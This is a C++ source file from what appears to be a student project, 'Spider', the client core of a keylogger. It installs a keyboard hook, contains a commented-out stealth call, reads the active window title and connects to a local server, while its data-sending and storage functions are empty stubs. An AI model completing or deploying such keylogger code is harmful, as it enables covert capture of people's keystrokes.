//
// Core.cpp for Spider client in /home/touzet_t/epitech/cpp/cpp_spider/client
// 
// Made by Theo TOUZET
// Login   <touzet_t@epitech.net>
// 
// Started on  Tue Nov  1 13:50:03 2016 Theo TOUZET
// Last update Tue Nov  1 13:50:10 2016 Theo TOUZET
//

#include "Core.hh"

Core::Core()
{

}

Core::~Core()
{
}

int	Core::sendData(const std::string &msg)
{
	return (0);
}

int	Core::storeInReg(const std::string &msg)
{
	return (0);
}

int	Core::storeLocally(const std::string &msg)
{
	return (0);
}

int	Core::run()
{
	bool Continue = true;
	//BOOL bRet;
	bool connected;
	std::queue<std::string> queue;

	if (keylog.installhook() == false)
		Continue = false;
	//keylog.stealth();

	std::cout << keylog.GetActiveWindowTitle() << std::endl;
	connected = net.connect("127.0.0.1", 4242);
	while (Continue)
	{
		keylog.peekMsg();
		net.receive();
		queue = net.getQueue();
		if (queue.size() > 0) {
			if (queue.front() == "") {

			} else if (queue.front() == "") {
			
			} else {
			
			}
			queue.pop();
		}
	}
	return (0);
}